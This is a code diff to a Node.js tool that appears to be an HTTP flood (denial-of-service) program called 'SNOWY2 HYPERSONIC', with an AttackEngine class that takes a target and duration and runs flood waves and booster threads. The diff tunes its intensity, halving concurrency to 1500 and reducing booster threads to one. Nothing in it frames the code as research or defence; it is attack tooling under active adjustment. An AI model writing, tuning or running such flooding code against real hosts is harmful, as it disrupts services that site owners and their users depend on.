@@ -5,7 +5,7 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 
-const FIXED_CONCURRENCY = 3000;
+const FIXED_CONCURRENCY = 1500; // Reduced concurrency to 1500
 const CPU_COUNT = os.cpus().length;
 const REQUEST_TIMEOUT = 8000;
 
@@ -97,18 +97,14 @@ class AttackEngine {
     }
 
     async run() {
-        console.log(`\nSNOWY2 HYPERSONIC - ${FIXED_CONCURRENCY} CONC + BOOST x${CPU_COUNT * 2}`);
+        console.log(`\nSNOWY2 HYPERSONIC - ${FIXED_CONCURRENCY} CONC`);
         console.log('='.repeat(60));
         console.log(`TARGET: ${this.target}`);
         console.log(`DURATION: ${this.duration / 1000}s`);
         console.log('='.repeat(60));
 
         const statTicker = setInterval(() => this.displayLive(), 100);
-        const boosters = [];
-
-        for (let i = 0; i < CPU_COUNT * 2; i++) {
-            boosters.push(this.boosterThread());
-        }
+        const boosters = [this.boosterThread()]; // Just 1x booster thread for now
 
         while (Date.now() - this.startTime < this.duration) {
             await this.fixedFloodWave();
